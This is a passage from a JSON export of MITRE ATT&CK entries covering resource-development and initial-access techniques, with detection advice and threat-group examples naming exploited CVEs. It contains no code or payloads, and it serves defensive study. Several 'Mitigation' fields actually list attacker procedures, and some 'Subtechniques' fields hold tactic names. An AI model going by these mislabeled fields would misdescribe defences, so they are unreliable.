        "description": "APT17 has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate, APT17 has created biographical sections and posted in forum threads.[4]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has created KeyBase accounts to communicate with ransomware victims.[5][6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "DS0021",
        "dsource": "Persona",
        "dcomp": "Social Media",
        "detects": "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing)."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1585.001",
        "name": "Social Media Accounts"
      },
      {
        "id": "T1585.002",
        "name": "Email Accounts"
      },
      {
        "id": "T1585.003",
        "name": "Cloud Accounts"
      }
    ],
    "Tactic": "\nResource Development"
  },
  {
    "Title": "Obtain Capabilities",
    "Code": "T1588",
    "Description": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.[1][2]In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.[3]",
    "Mitigation": [
      {
        "id": "M1056",
        "name": "Pre-compromise",
        "description": "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."
      }
    ],
    "Detection": [
      {
        "id": "DS0037",
        "dsource": "Certificate",
        "dcomp": "Certificate Registration",
        "detects": "Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.[4] Some server-side components of adversary tools may have default values set for SSL/TLS certificates.[5] Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
      },
      {
        "id": "DS0035",
        "dsource": "Internet Scan",
        "dcomp": "Response Content",
        "detects": "Monitor for logged network traffic in response to a scan showing both protocol header and body values that may buy and/or steal capabilities that can be used during targeting. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
      },
      {
        "id": "DS0004",
        "dsource": "Malware Repository",
        "dcomp": "Malware Content",
        "detects": "Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific Malware-as-a-Service (MaaS) offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.[6] Malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in Cobalt Strike payloads.[7]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Malware Metadata",
        "detects": "Monitor for contextual data about a malicious payload, such as compilation times, file hashes, as well as watermarks or other identifiable configuration information. Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1588.001",
        "name": "Malware"
      },
      {
        "id": "T1588.002",
        "name": "Tool"
      },
      {
        "id": "T1588.003",
        "name": "Code Signing Certificates"
      },
      {
        "id": "T1588.004",
        "name": "Digital Certificates"
      },
      {
        "id": "T1588.005",
        "name": "Exploits"
      },
      {
        "id": "T1588.006",
        "name": "Vulnerabilities"
      }
    ],
    "Tactic": "\nResource Development"
  },
  {
    "Title": "Stage Capabilities",
    "Code": "T1608",
    "Description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.[1][2][3][4][5]Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):Staging web resources necessary to conduct Drive-by Compromise when a user browses to a site.[6][7][8]Staging web resources for a link target to be used with spearphishing.[9][10]Uploading malware or tools to a location accessible to a victim network to enable Ingress Tool Transfer.[1]Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: Asymmetric Cryptography with Web Protocols).[11]",
    "Mitigation": [
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has used servers under their control to validate tracking pixels sent to phishing victims.[12]"
      }
    ],
    "Detection": [
      {
        "id": "DS0035",
        "dsource": "Internet Scan",
        "dcomp": "Response Content",
        "detects": "If infrastructure or patterns in malware, tooling, certificates, or malicious web content have been previously identified, internet scanning may uncover when an adversary has staged their capabilities.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as initial access and post-compromise behaviors."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1608.001",
        "name": "Upload Malware"
      },
      {
        "id": "T1608.002",
        "name": "Upload Tool"
      },
      {
        "id": "T1608.003",
        "name": "Install Digital Certificate"
      },
      {
        "id": "T1608.004",
        "name": "Drive-by Target"
      },
      {
        "id": "T1608.005",
        "name": "Link Target"
      },
      {
        "id": "T1608.006",
        "name": "SEO Poisoning"
      }
    ],
    "Tactic": "\nResource Development"
  },
  {
    "Title": "Content Injection",
    "Code": "T1659",
    "Description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems.[1]Adversaries may inject content to victim systems in various ways, including:From the middle, where the adversary is in-between legitimate online client-server communications (Note: this is similar but distinct from Adversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment) [2]From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server [3]Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"[3][1][4]",
    "Mitigation": [
      {
        "id": "S1088",
        "name": "Disco",
        "description": "Disco has achieved initial access and execution through content injection into DNS,  HTTP, and SMB replies to targeted hosts that redirect them to download malicious files.[5]"
      },
      {
        "id": "G1019",
        "name": "MoustachedBouncer",
        "description": "MoustachedBouncer has injected content into DNS, HTTP, and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for unexpected and abnormal file creations that may indicate malicious content injected through online network communications."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor for other unusual network traffic that may indicate additional malicious content transferred to the system. Use network intrusion detection systems, sometimes with SSL/TLS inspection, to look for known malicious payloads, content obfuscation, and exploit code."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Look for behaviors on the endpoint system that might indicate successful compromise, such as abnormal behaviors of browser processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, or evidence of Discovery."
      }
    ],
    "Subtechniques": "InitialAccess, CommandandControl"
  },
  {
    "Title": "Drive-by Compromise",
    "Code": "T1189",
    "Description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.Multiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scriptingScript files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversaryMalicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.[1]Typical drive-by compromise process:A user visits a website that is used to host the adversary controlled content.Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.Upon finding a vulnerable version, exploit code is delivered to the browser.If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.In some cases a second visit to the website after the initial scan is required before exploit code is delivered.Unlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.Adversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.[2]",
    "Mitigation": [
      {
        "id": "G0138",
        "name": "Andariel",
        "description": "Andariel has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range.[3][4]"
      },
      {
        "id": "G0073",
        "name": "APT19",
        "description": "APT19 performed a watering hole attack on forbes.com in 2014 to compromise targets.[5]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has compromised targets via strategic web compromise utilizing custom exploit kits.[6]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has infected victims by tricking them into visiting compromised watering hole websites.[7][8]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.[9][10][11]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has conducted watering holes schemes to gain initial access to victims.[12][13]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has used watering hole attacks to gain access.[14]"
      },
      {
        "id": "S0606",
        "name": "Bad Rabbit",
        "description": "Bad Rabbit spread through watering holes on popular sites by injecting JavaScript into the HTML body or a .js file.[15][16]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER compromised three Japanese websites using a Flash exploit to perform watering hole attacks.[17]"
      },
      {
        "id": "S0482",
        "name": "Bundlore",
        "description": "Bundlore has been spread through malicious advertisements on websites.[18]"
      },
      {
        "id": "C0010",
        "name": "C0010",
        "description": "During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.[19]"
      },
      {
        "id": "G0070",
        "name": "Dark Caracal",
        "description": "Dark Caracal leveraged a watering hole to serve up malicious code.[20]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel used embedded iframes on hotel login portals to redirect selected victims to download malware.[21]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.[22][23][24]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca has performed watering hole attacks.[25]"
      },
      {
        "id": "G0066",
        "name": "Elderwood",
        "description": "Elderwood has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.[26][27][28]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro has used compromised websites and Google Ads to bait victims into downloading its installer.[29][30]"
      },
      {
        "id": "S0215",
        "name": "KARAE",
        "description": "KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.[10]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group delivered RATANKBA and other malicious code to victims via a compromised legitimate website.[31][32]"
      },
      {
        "id": "G0077",
        "name": "Leafminer",
        "description": "Leafminer has infected victims using watering holes.[33]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has infected victims using watering holes.[34]"
      },
      {
        "id": "S0451",
        "name": "LoudMiner",
        "description": "LoudMiner is typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.[35]"
      },
      {
        "id": "G0095",
        "name": "Machete",
        "description": "Machete has distributed Machete through a fake blog website.[36]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has conducted watering-hole attacks through media and magazine websites.[37]"
      },
      {
        "id": "C0016",
        "name": "Operation Dust Storm",
        "description": "During Operation Dust Storm, the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322.[38]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork has used watering holes to deliver files with exploits to initial victims.[39][40]"
      },
      {
        "id": "G0068",
        "name": "PLATINUM",
        "description": "PLATINUM has sometimes used drive-by attacks against vulnerable browser plugins.[41]"
      },
      {
        "id": "S0216",
        "name": "POORAIM",
        "description": "POORAIM has been delivered through compromised sites acting as watering holes.[10]"
      },
      {
        "id": "G0056",
        "name": "PROMETHIUM",
        "description": "PROMETHIUM has used watering hole attacks to deliver malicious versions of legitimate installers.[42]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil has infected victim machines through compromised websites and exploit kits.[43][44][45][46]"
      },
      {
        "id": "G0048",
        "name": "RTM",
        "description": "RTM has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network Yandex.Direct.[47][48]"
      },
      {
        "id": "S1086",
        "name": "Snip3",
        "description": "Snip3 has been delivered to targets via downloads from malicious domains.[49]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has extensively used strategic web compromises to target victims.[50][51]"
      },
      {
        "id": "G0134",
        "name": "Transparent Tribe",
        "description": "Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.[52][53][54]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has infected victims using watering holes.[55][56]"
      },
      {
        "id": "G0124",
        "name": "Windigo",
        "description": "Windigo has distributed Windows malware via drive-by downloads.[57]"
      },
      {
        "id": "G0112",
        "name": "Windshift",
        "description": "Windshift has used compromised websites to register custom URL schemes on a remote system.[58]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files written to disk to gain access to a system through a user visiting a website over the normal course of browsing."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections to untrusted hosts that are used to send or receive data."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor for other unusual network traffic that may indicate additional tools transferred to the system. Use  network intrusion detection systems, sometimes with SSL/TLS inspection, to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Look for behaviors on the endpoint system that might indicate successful compromise, such as abnormal behaviors of browser processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, or evidence of Discovery."
      }
    ],
    "Subtechniques": "\nInitial Access"
  },
  {
    "Title": "Exploit Public-Facing Application",
    "Code": "T1190",
    "Description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.[1][2][3][4][5] Depending on the flaw being exploited this may also involve Exploitation for Defense Evasion. If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.[6][7]For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.[8][9]",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.[10][11]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.[12][13]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used SQL injection for initial compromise.[14]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.[15]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has been observed using SQL injection to gain access to systems.[16][17]"
      },
      {
        "id": "G0135",
        "name": "BackdoorDiplomacy",
        "description": "BackdoorDiplomacy has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor. BackdoorDiplomacy has also exploited mis-configured Plesk servers.[18]"
      },
      {
        "id": "G0098",
        "name": "BlackTech",
        "description": "BlackTech has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.[19]"
      },
      {
        "id": "G0108",
        "name": "Blue Mockingbird",
        "description": "Blue Mockingbird has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.[20]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.[21]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities, including CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832.[22]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access.[23]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.[24]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca has compromised victims by directly exploiting vulnerabilities of public-facing servers, including those associated with Microsoft Exchange and Oracle GlassFish.[25]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection), CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit), CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit), and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access.[26][27]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances.[28][29][30][31][32]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.[33][34]"
      },
      {
        "id": "G0115",
        "name": "GOLD SOUTHFIELD",
        "description": "GOLD SOUTHFIELD has exploited Oracle WebLogic vulnerabilities for initial compromise.[35]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.[36][37][38][39]"
      },
      {
        "id": "S0224",
        "name": "Havij",
        "description": "Havij is used to automate SQL injection.[40]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has compromised networks by exploiting Internet-facing applications, including vulnerable Microsoft Exchange and SharePoint servers.[41]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688.[42]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via \"ProxyShell\" (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs (CVE-2018-13379).[43][44][45][46][47]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.[48]"
      },
      {
        "id": "G1009",
        "name": "Moses Staff",
        "description": "Moses Staff has exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers.[49]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).[50]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used SQL injection exploits against extranet web servers to gain access.[51]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors exploited multiple vulnerabilities in externally facing servers.[52]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors gained initial access by exploiting vulnerabilities in JBoss webservers.[53]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.[54][55]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape is executed after the attacker gains initial access to a Windows container using a known vulnerability.[56]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.[57][12]"
      },
      {
        "id": "S0516",
        "name": "SoreFang",
        "description": "SoreFang can gain access by exploiting a Sangfor SSL VPN vulnerability that allows for the placement and delivery of malicious update binaries.[58]"
      },
      {
        "id": "S0225",
        "name": "sqlmap",
        "description": "sqlmap can be used to automate exploitation of SQL injection vulnerabilities.[59]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.[60]"
      },
      {
        "id": "G0123",
        "name": "Volatile Cedar",
        "description": "Volatile Cedar has targeted publicly facing web servers, with both automatic and manual vulnerability discovery.[61] [62]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon gained initial access through exploitation of CVE-2021-40539 in internet-facing ManageEngine ADSelfService Plus servers.[63]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell has been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.[64]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Web Application Firewalls may detect improper inputs attempting exploitation."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection strings or known payloads."
      }
    ],
    "Subtechniques": "\nInitial Access"
  },
  {
    "Title": "External Remote Services",
    "Code": "T1133",
    "Description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.[1]Access to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.[2] Access to remote services may be used as a redundant or persistent access mechanism during an operation.Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.[3][4]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. [5]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 actors leverage legitimate credentials to log into external remote services.[6]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts.[7]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used compromised identities to access networks via VPNs and Citrix.[8][9]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.[10]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments.[11]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services.[12][13]"
      },
      {
        "id": "C0004",
        "name": "CostaRicto",
        "description": "During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.[14]"
      },
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki was executed through an open Docker daemon API port.[15]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.[16][17]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN).[18]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment.[19][20][21]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.[22][23]"
      },
      {
        "id": "G0115",
        "name": "GOLD SOUTHFIELD",
        "description": "GOLD SOUTHFIELD has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.[24]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard was executed through an unsecure kubelet that allowed anonymous access to the victim environment.[4]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has gained access through VPNs including with compromised accounts and stolen VPN certificates.[25][26]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used RDP to establish persistence.[27]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing was executed in an Ubuntu container deployed via an open Docker daemon API.[28]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix. [29][30]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access.[31]"
      },
      {
        "id": "S0362",
        "name": "Linux Rabbit",
        "description": "Linux Rabbit attempts to gain access to the server via SSH.[32]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can establish an SSH connection from a compromised host to a server.[33]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[34]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment.[35]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
